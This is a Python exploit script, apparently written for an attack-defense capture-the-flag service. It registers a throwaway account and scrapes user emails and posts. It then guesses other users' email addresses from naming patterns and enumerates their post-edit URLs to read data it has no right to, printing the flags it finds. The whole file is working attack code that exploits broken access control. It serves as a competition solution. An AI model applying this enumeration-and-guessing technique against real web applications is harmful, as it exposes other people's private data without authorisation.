import html
import requests
import secrets
import re

# ADDRESS = '172.17.0.1'
ADDRESS = '127.0.0.1'
PORT = '4242'
pattern1 = re.compile("My boss (\w+ \w+) is great. .* Cheers, (\w+ \w+)")
pattern2 = re.compile(".*@.*")
pattern3 = re.compile("ENO.{48}")

def create_boss_email(email, name1, name2):
    # Guesses another user's email based on the known user's email pattern (email), the new user's full name (name1), and the known user's full name (name2)
    email_patterns = [
        lambda x: f"{x[0][0]}.{x[1]}",
        lambda x: f"{x[0]}.{x[1]}",
        lambda x: f"{x[0]}{x[1]}",
        lambda x: f"{x[0][0]}{x[1]}",
        lambda x: f"{x[1]}",
        lambda x: f"{x[0]}",
        lambda x: f"{x[0]}{x[1][0]}",
    ]
    user_name = name2.lower().split(" ")
    for p in email_patterns:
        e = p(user_name)
        e += "@" + email.split("@")[-1]
        if email == e:
            return p(name1.lower().split(" ")) + "@" + email.split("@")[-1]

def exploit():
    s = requests.Session()
    # Create new account
    s.post(f"http://{ADDRESS}:{PORT}/auth/signup", data={"email": f"{secrets.token_urlsafe(16)}@gmail.com", "password": {secrets.token_urlsafe(16)}})
    resp = s.get(f"http://{ADDRESS}:{PORT}/posts")
    # Split post list by user
    user_posts = html.unescape(resp.text).split("Activities by")
    for section in user_posts:
        # find user's email and all posts matching pattern
        email = re.findall(pattern2, section).pop().strip()
        posts = re.findall(pattern1, section)
        for post in posts:
            # generate email to attack
            email_to_attack = create_boss_email(email, post[0], post[1])
            n = 0
            while True:
                n += 1
                # get flag by editing post based on known email
                resp = s.get(f"http://{ADDRESS}:{PORT}/posts/update/{email_to_attack}/{n}")
                if resp.status_code != 200:
                    break
                flag = re.findall(pattern3, html.unescape(resp.text))
                for f in flag:
                    print(f)



if __name__ == '__main__':
    exploit()